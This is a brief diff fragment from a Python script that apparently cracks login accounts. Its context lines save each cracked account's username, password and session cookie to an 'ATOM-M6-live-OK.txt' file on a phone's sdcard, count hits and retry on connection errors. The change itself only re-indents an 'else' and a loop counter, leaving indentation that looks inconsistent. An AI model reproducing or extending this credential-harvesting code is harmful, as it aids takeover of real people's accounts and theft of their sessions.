@@ -992,11 +992,11 @@ def m2(idf,pwv):
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
-     else:
+    else:
      continue
   except requests.exceptions.ConnectionError:
       waktu(31)
-loop+=1
+ loop+=1
   
 
 
